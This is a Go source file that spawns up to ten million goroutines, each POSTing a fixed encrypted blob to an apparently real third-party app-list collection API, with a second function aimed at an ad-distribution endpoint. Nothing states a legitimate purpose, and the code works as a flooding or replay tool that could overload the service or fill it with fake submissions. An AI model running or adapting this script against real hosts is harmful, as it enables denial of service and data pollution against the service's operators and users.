package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func main() {
	j := 0
	//for i := 0; i <= 100; i++ {
	//	j++
	//	go sendPost2(j)
	//}
	for k := 0; k <= 10000000; k++ {
		j++
		go sendPost(j)
		if j%300 == 0 {
			time.Sleep(time.Duration(3) * time.Second)
		}
	}
	//time.Sleep(time.Duration(5)*time.Second)
	for true {

	}
}

func sendPost2(i int) {
	apiUrl := "http://guess-union2-50bang.st5.2345.cn"
	resource := "/adsapi/distribute"
	data := "Gf8Iad//Myha/7OdUFNHiennSF86uct2YWztBWrf19DcAffEulQfHSoB437Zg6jipS5D4ZpEPlwLD6WHBDkL9tpSPoiWmd/1orFpkdd2E1YcyKtRHBGxJa30vcm+dPxjBE4yyGQnhma4MBDigMYpcUgkktYAUKtRv8ybxynpAcqj4KjqmLphpOpWZcKSzJCzHzC+nUod4QsYsK/lHiEbHuLPrWF9ZLHSLasXXrvovHk8ZxZB8H0tHD7ND8M22F/9fmQuB7Til9wH/2iOMAv/BwIE64XG4n78IIW3wHFHokfR99Ku4zaJXVMOjpNIuXqF9wT/gbqjnJeeF8weEj0L+KTQG5cPuWMtbJSf/tbx1fZZW9hRItTsLYUF5Nmwzfw3YtO0UdRbvP844YOcv7U2FP+N8yDkGurkPplds1bx4oxymiHJZ0xF3BWJ3g9qbzz/+vuzQLZ9g48IU5u71FHRiZMuZrAb0WxAT46rPk7tEHZMGKmHoVJcdXT+CH5wuAxHG3fZ4sKYFqz8bS4Dwmx9UeMbMq5RPQZCZhzgWYR3fH4h5+Ej+ptuBNKGRSeYmCkfoPHqz0DN+Y69z9eN4CzkcjnKQW+0u8tg1mPLeF0vS/j8quI6f6cVwjLPqtr5531UIWgHG2yma0romOFcyVTCp9WqvjEQ/K+V6s0F15o2FcSJrTLc6BOxmVHneh+LIJVo1wxNM1ifrn8trjhIHve7zTcQIi+/eGlUBPhxVfuHYRw7mAcVRNx9h9n//OWb2YIkyaMD/6JgHK0kUr8y5zOXKjYeuBPT54ora39n5NCI64DoNW0L64/qt9H11cOwYjojzTliAsNN+d7kkpFDu7iR8jwtM+Dr9ym8FiZYqp5w8NeD5wPil8Pmnlm8/VpOAawndY9hAUn4CBPbaiie3tGIECGB6v38Q59Bt5PxBiFoSd2sBC3QI6yFUvcnvi2O2suYP76hXHbG6/Cu3ITI0xU5kO6DSTtZkoZZuZfB1UaY9YqOa/hVBW24qsp+tc/yzATToDXfoHEuCxpxdjw3f+cLgCZjPz8Mfv+q6oyUkels4GhYEytmwBIuks50VWaRYIoyn7mUpS6vGy3W2coNWjwXCh2tkOI73uy05e4E2UkRoI7u1Q7KnwV74v2L3Kfsx6AIoktTQyL1ZjjagsR2UY1G1aiBT++BT47A9IPoFH1bP3A="

	u, _ := url.ParseRequestURI(apiUrl)
	u.Path = resource
	urlStr := u.String() // "http://127.0.0.1/tpost"

	client := &http.Client{}
	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data)) // URL-encoded payload
	r.Header.Add("Content-Type", "application/json")
	//r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	//fmt.Println(strings.NewReader(data))

	resp, err := client.Do(r)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer resp.Body.Close()
	//res, _ := ioutil.ReadAll(resp.Body)
	//str := (*string)(unsafe.Pointer(&res))
	//fmt.Println(res)
	//str := string(res)
	//fmt.Println(str)
	fmt.Println("post send success:" + string(i))
}

func sendPost(i int) {
	apiUrl := "http://cloud-union.2345.com"
	resource := "/api/package/applist/accept"
	data := "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"

	u, _ := url.ParseRequestURI(apiUrl)
	u.Path = resource
	urlStr := u.String() // "http://127.0.0.1/tpost"

	client := &http.Client{}
	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data)) // URL-encoded payload
	r.Header.Add("Content-Type", "application/json")
	//r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	//fmt.Println(strings.NewReader(data))

	resp, err := client.Do(r)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer resp.Body.Close()
	fmt.Println(resp.Status)
	//res, _ := ioutil.ReadAll(resp.Body)
	//str := (*string)(unsafe.Pointer(&res))
	//fmt.Println(res)
	//str := string(res)
	//fmt.Println(str)
	//fmt.Println("post send success:" + string(i))
}
